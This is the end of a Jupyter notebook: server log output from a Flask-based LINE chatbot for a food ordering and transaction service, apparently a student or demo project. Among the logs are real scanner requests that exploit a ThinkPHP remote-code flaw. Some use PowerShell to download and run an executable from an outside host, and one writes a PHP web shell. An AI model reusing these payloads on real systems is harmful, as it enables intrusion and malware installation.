      "192.168.224.4 - - [15/Mar/2019 05:12:39] \"POST / HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]歷史交易\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 05:12:42] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 05:12:45] \"POST / HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]本次交易\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n",
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 05:12:46] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 05:12:49] \"GET /administrator HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 05:12:52] \"GET /passengerFlows HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 05:12:59] \"GET /administrator HTTP/1.1\" 200 -\n",
      "77.247.109.70 - - [15/Mar/2019 06:09:51] \"HEAD /robots.txt HTTP/1.0\" 404 -\n",
      "192.168.224.4 - - [15/Mar/2019 06:59:44] \"GET /pushMessage/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 06:59:45] \"GET /pushMessage/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 07:03:00] \"GET /transaction_commit/U7173dc299af6ac3fe7697a75c2a280ad HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 07:03:05] \"GET /transaction_commit/Udf8f1c512878156d2bf8d0051d4f2429 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Udf8f1c512878156d2bf8d0051d4f2429\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 07:03:15] \"GET /transaction_commit/U1e91bf35eb5315bc17da624e46a65c51 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U1e91bf35eb5315bc17da624e46a65c51\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 07:03:21] \"GET /transaction_commit/Uaefa84530bef60672e135c6cee89341d HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Uaefa84530bef60672e135c6cee89341d\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 07:03:31] \"GET /transaction_commit/U9a1715c6ffdf0ef2ffe148726d336011 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U9a1715c6ffdf0ef2ffe148726d336011\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 07:03:39] \"GET /transaction_commit/Ua0ac6b70d3611ea9d3d4665941dbf3f7 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : Ua0ac6b70d3611ea9d3d4665941dbf3f7\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 07:03:42] \"GET /transaction_commit/U30256c6d3c01f118f8c96f05e1f0f094 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U30256c6d3c01f118f8c96f05e1f0f094\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 07:03:48] \"GET /transaction_commit/U934211376c8da4cc677c3b801bd9f8db HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U934211376c8da4cc677c3b801bd9f8db\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 07:03:54] \"GET /transaction_commit/U26c1d062b5768c0ab8721698973d67b1 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "From : U26c1d062b5768c0ab8721698973d67b1\n",
      "Transaction Completed!\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 08:30:28] \"GET /food/logo.png HTTP/1.1\" 200 -\n",
      "69.163.152.106 - - [15/Mar/2019 08:32:59] \"HEAD / HTTP/1.0\" 405 -\n",
      "85.192.164.142 - - [15/Mar/2019 09:49:03] \"GET / HTTP/1.1\" 405 -\n",
      "13.112.46.109 - - [15/Mar/2019 11:09:11] \"GET /public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/aegzqtzfihtzhbc4638.exe');start%20C:/Windows/temp/aegzqtzfihtzhbc4638.exe HTTP/1.1\" 404 -\n",
      "13.112.46.109 - - [15/Mar/2019 11:09:11] \"GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php HTTP/1.1\" 404 -\n",
      "13.112.46.109 - - [15/Mar/2019 11:09:11] \"GET /public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/aegzqtzfihtzhbc4638.exe');start%20C:/Windows/temp/aegzqtzfihtzhbc4638.exe HTTP/1.1\" 404 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U23d091bfdaacf722fa39f82776b3c410\n",
      "    UserName : Rickyyuan\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U23d091bfdaacf722fa39f82776b3c410\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 11:53:52] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 11:54:00] \"GET /usercentre/U23d091bfdaacf722fa39f82776b3c410 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 11:54:01] \"GET /favicon.ico HTTP/1.1\" 404 -\n",
      "192.168.224.4 - - [15/Mar/2019 11:54:10] \"POST / HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U23d091bfdaacf722fa39f82776b3c410\n",
      "    UserName : Rickyyuan\n",
      "    Said : [::flex:]促銷食材\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U23d091bfdaacf722fa39f82776b3c410\n",
      "    \n",
      "\n",
      "    From : U23d091bfdaacf722fa39f82776b3c410\n",
      "    UserName : Rickyyuan\n",
      "    Said : [::text:]本次交易\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U23d091bfdaacf722fa39f82776b3c410\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 11:54:19] \"POST / HTTP/1.1\" 200 -\n",
      "[2019-03-15 11:54:24,700] ERROR in app: Exception on /transaction/now/U23d091bfdaacf722fa39f82776b3c410 [GET]\n",
      "Traceback (most recent call last):\n",
      "  File \"/opt/conda/lib/python3.7/site-packages/flask/app.py\", line 1982, in wsgi_app\n",
      "    response = self.full_dispatch_request()\n",
      "  File \"/opt/conda/lib/python3.7/site-packages/flask/app.py\", line 1614, in full_dispatch_request\n",
      "    rv = self.handle_user_exception(e)\n",
      "  File \"/opt/conda/lib/python3.7/site-packages/flask/app.py\", line 1517, in handle_user_exception\n",
      "    reraise(exc_type, exc_value, tb)\n",
      "  File \"/opt/conda/lib/python3.7/site-packages/flask/_compat.py\", line 33, in reraise\n",
      "    raise value\n",
      "  File \"/opt/conda/lib/python3.7/site-packages/flask/app.py\", line 1612, in full_dispatch_request\n",
      "    rv = self.dispatch_request()\n",
      "  File \"/opt/conda/lib/python3.7/site-packages/flask/app.py\", line 1598, in dispatch_request\n",
      "    return self.view_functions[rule.endpoint](**req.view_args)\n",
      "  File \"<ipython-input-11-5234e6cd1b2d>\", line 77, in transactionNow\n",
      "    with open('./transaction_status/%s'%(userID), 'r', encoding='utf-8') as f:\n",
      "FileNotFoundError: [Errno 2] No such file or directory: './transaction_status/U23d091bfdaacf722fa39f82776b3c410'\n",
      "192.168.224.4 - - [15/Mar/2019 11:54:24] \"GET /transaction/now/U23d091bfdaacf722fa39f82776b3c410 HTTP/1.1\" 500 -\n",
      "192.168.224.4 - - [15/Mar/2019 11:54:25] \"GET /favicon.ico HTTP/1.1\" 404 -\n",
      "185.10.68.51 - - [15/Mar/2019 12:07:08] \"GET / HTTP/1.1\" 405 -\n",
      "192.168.224.4 - - [15/Mar/2019 12:12:23] \"GET /pushMessage/U23d091bfdaacf722fa39f82776b3c410 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 12:12:25] \"GET /pushMessage/U23d091bfdaacf722fa39f82776b3c410 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 12:12:43] \"GET /pushMessage/U23d091bfdaacf722fa39f82776b3c410 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 12:12:47] \"POST /pushMessage/U23d091bfdaacf722fa39f82776b3c410 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 12:16:14] \"GET /food/U7173dc299af6ac3fe7697a75c2a280ad.jpg HTTP/1.1\" 200 -\n",
      "185.53.91.50 - - [15/Mar/2019 12:20:44] \"GET /admin/assets/js/views/login.js HTTP/1.1\" 404 -\n",
      "178.156.202.224 - - [15/Mar/2019 12:37:06] \"GET / HTTP/1.1\" 405 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U23d091bfdaacf722fa39f82776b3c410\n",
      "    UserName : Rickyyuan\n",
      "    Said : [::text:]本次交易\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U23d091bfdaacf722fa39f82776b3c410\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 12:47:31] \"POST / HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 12:47:44] \"GET /pushMessage/U23d091bfdaacf722fa39f82776b3c410 HTTP/1.1\" 200 -\n",
      "192.168.224.4 - - [15/Mar/2019 12:47:50] \"POST /pushMessage/U23d091bfdaacf722fa39f82776b3c410 HTTP/1.1\" 200 -\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "    From : U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    UserName : UUBOY\n",
      "    Said : [::text:]會員中心\n",
      "    -----------\n",
      "    Reply\n",
      "    https://0da3c1a2.ngrok.io/pushMessage/U7173dc299af6ac3fe7697a75c2a280ad\n",
      "    \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "192.168.224.4 - - [15/Mar/2019 12:48:14] \"POST / HTTP/1.1\" 200 -\n",
      "13.112.46.109 - - [15/Mar/2019 13:06:00] \"GET /struts2-rest-showcase/orders.xhtml HTTP/1.1\" 404 -\n",
      "13.112.46.109 - - [15/Mar/2019 13:06:00] \"GET /index.action HTTP/1.1\" 404 -\n",
      "13.112.46.109 - - [15/Mar/2019 13:06:00] \"GET /index.do HTTP/1.1\" 404 -\n"
     ]
    }
   ],
   "source": [
    "'''\n",
    "\n",
    "執行此句，啟動Server，觀察後，按左上方塊，停用Server\n",
    "\n",
    "'''\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    #app.debug = True\n",
    "    app.run(host='0.0.0.0')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#pymysql.err.OperationalError\n",
    "#pymysql.err.InterfaceError"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
